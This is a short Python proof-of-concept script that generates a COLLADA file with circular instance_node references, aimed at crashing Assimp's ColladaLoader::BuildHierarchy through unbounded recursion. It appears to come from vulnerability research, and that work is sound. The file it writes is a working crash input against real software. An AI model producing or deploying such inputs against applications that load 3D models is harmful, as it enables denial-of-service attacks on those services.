#!/usr/bin/env python3
"""Generate PoC for Assimp ColladaLoader::BuildHierarchy stack overflow.

A COLLADA file with circular <instance_node> references (or deeply nested
<node> elements in the visual scene) triggers unbounded recursion in
ColladaLoader::BuildHierarchy() at ColladaLoader.cpp:235.
"""
import os

OUT = os.path.dirname(os.path.abspath(__file__))


def make_collada_circular_instance():
    """Circular instance_node references: nodeA -> nodeB -> nodeA."""
    xml = '<?xml version="1.0"?>\n'
    xml += '<COLLADA xmlns="http://www.collada.org/2005/11/COLLADASchema" version="1.4.1">\n'
    xml += '<library_nodes>\n'
    xml += '  <node id="nodeA" name="A" type="NODE">\n'
    xml += '    <instance_node url="#nodeB"/>\n'
    xml += '  </node>\n'
    xml += '  <node id="nodeB" name="B" type="NODE">\n'
    xml += '    <instance_node url="#nodeA"/>\n'
    xml += '  </node>\n'
    xml += '</library_nodes>\n'
    xml += '<library_visual_scenes>\n'
    xml += '  <visual_scene id="scene">\n'
    xml += '    <node id="root" type="NODE">\n'
    xml += '      <instance_node url="#nodeA"/>\n'
    xml += '    </node>\n'
    xml += '  </visual_scene>\n'
    xml += '</library_visual_scenes>\n'
    xml += '<scene><instance_visual_scene url="#scene"/></scene>\n'
    xml += '</COLLADA>\n'

    out_path = os.path.join(OUT, "poc.dae")
    with open(out_path, "wb") as f:
        f.write(xml.encode())
    print(f"Written {len(xml)} bytes to {out_path}")


if __name__ == "__main__":
    make_collada_circular_instance()
